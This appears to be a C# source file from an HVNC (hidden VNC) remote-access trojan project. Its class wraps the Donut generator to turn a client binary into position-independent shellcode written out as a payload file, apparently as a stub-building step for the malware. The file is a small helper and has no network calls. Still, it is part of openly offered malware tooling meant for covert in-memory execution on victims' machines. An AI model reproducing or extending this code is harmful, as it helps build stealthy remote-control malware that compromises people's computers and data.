using System;
using System.Runtime.InteropServices;
using BirdBrainmofo.HVNC.StubUtils.Donut.Structs;

namespace BirdBrainmofo.HVNC.StubUtils.Donut
{
    public class Donut
    {
        public static void Generate(string client, string payload)
        {
            DSConfig config = new Helper().InitStruct("DSConfig");
            Helper.Copy(config.outfile, payload);
            Helper.Copy(config.file, client);
            int num = Generator.Donut_Create(ref config);
            Console.WriteLine("\nReturn Value:\n\t" + Helper.GetError(num) + "\n");
            if (num != 0)
            {
                Marshal.FreeHGlobal(config.pic);
                Environment.Exit(0);
            }
            Marshal.FreeHGlobal(config.pic);
        }
    }
}